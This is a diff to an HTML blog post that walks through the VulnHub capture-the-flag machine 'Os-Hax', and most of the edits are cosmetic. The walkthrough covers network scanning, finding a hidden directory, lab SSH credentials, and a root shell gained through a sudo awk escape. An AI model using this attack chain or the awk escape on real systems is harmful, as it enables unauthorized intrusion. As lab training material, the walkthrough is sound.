@@ -46,7 +46,7 @@
                     <span class="sr-only">Toggle navigation</span>
                     Menu <i class="fa fa-bars"></i>
                 </button>
-                <a class="navbar-brand" href="index.html">(´• ω •) 🎄</a>
+                <a class="navbar-brand" href="index.html">(´• ω •)</a>
             </div>
 
             <!-- Collect the nav links, forms, and other content for toggling -->
@@ -79,8 +79,8 @@
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                     <div class="post-heading">
                         <h1>Os-Hax</h1>
-                        <h2 class="subheading">Difficulty : Easy</h2>
-                        <span class="meta">Posted by <a href="#">Admin</a> on December 2, 2019</span>
+                        <h2 class="subheading">Difficulty: Easy</h2>
+                        <span class="meta">Posted by <a href="about.html">Admin</a> on December 2, 2019</span>
                     </div>
                 </div>
             </div>
@@ -95,37 +95,39 @@
                     <p><a href="https://www.vulnhub.com/entry/hacknos-os-hax,389/">CTF link</a></p>
 					<h2 class="section-heading">Boot2User</h2>
 
-                    <p>At this stage, we will scan the network and find the ip address of the machine</p>
+                    <p>At this stage, we will scan the network and find the ip address of the machine.</p>
 					
 					<a href="img/post1/image1.png">
                         <img class="img-responsive" src="img/post1/image1.png" alt="">
                     </a>
+					
+					<pre><code>arp-scan -l</code></pre>
 
-                    <blockquote>arp-scan -l</blockquote>
-
-                    <p>As we see this is 192.168.2.102. Next we will see open ports</p>
+                    <p>As we see this is 192.168.2.102. Next we will see open ports.</p>
 					
 					<a href="img/post1/image2.png">
                         <img class="img-responsive" src="img/post1/image2.png" alt="">
                     </a>
-					<blockquote>nmap 192.168.2.102</blockquote>
+					<pre><code>nmap 192.168.2.102</code></pre>
 					
-					<p>Open ssh and apache, so let's check the web page</p>
+					<p>Open ssh and apache, so let's check the web page.</p>
 					
 					<a href="img/post1/image3.png">
                         <img class="img-responsive" src="img/post1/image3.png" alt="">
                     </a>
 					
-					<p>Now let's find something interesting</p>
+					<p>Now let's find something interesting.</p>
 					
-					<blockquote>nikto -h 192.168.2.102 -p 80</blockquote>
+					<pre><code>nikto -h 192.168.2.102 -p 80</code></pre>
 					
 					<a href="img/post1/image4.png">
                         <img class="img-responsive" src="img/post1/image4.png" alt="">
                     </a>
 					
 					<p>In directory /img/ nikto found an interesting file called flaghost.png. After scanning the image through exiftool, I get a new directory names, in which I find the file "flag2.txt"</p>
-					<blockquote>192.168.2.102/passw@45/</blockquote>
+					
+					<pre><code>192.168.2.102/passw@45/</code></pre>
+					
 					<a href="img/post1/image5.png">
                         <img class="img-responsive" src="img/post1/image5.png" alt="">
                     </a>
@@ -136,13 +138,13 @@
 					
 					<p>After decrypting a mysterious file that is encrypted with the Brainfuck cipher, I received data for ssh authorization.</p>
 					
-					<blockquote>web:Hacker@4514</blockquote>
+					<pre><code>web:Hacker@4514</code></pre>
 					
 					<a href="img/post1/image7.png">
                         <img class="img-responsive" src="img/post1/image7.png" alt="">
                     </a>
 					
-					<p>In home directory I found a flag</p>
+					<p>In home directory I found a flag.</p>
 					
 					<a href="img/post1/image8.png">
                         <img class="img-responsive" src="img/post1/image8.png" alt="">
@@ -150,12 +152,12 @@
 					
                     <h2 class="section-heading">Boot2R00t</h2>
 					
-					<p>Using following command i see that I can run awk using root privileges</p>
+					<p>Using following command i see that I can run awk using root privileges.</p>
 				
                     <a href="img/post1/image9.png">
                         <img class="img-responsive" src="img/post1/image9.png" alt="">
                     </a>
-					<blockquote>sudo -l</blockquote>
+					<pre><code>sudo -l</code></pre>
 					
 					<p>Now i get root using awk, thank awk xD</p>
 					
@@ -163,7 +165,7 @@
                         <img class="img-responsive" src="img/post1/image10.png" alt="">
                     </a>
                     
-					<blockquote>sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'</blockquote>
+					<pre><code>sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'</code></pre>
 					
 					<p>The all. Thanks Rahul Gehlaut for a good CTF.</p>
 
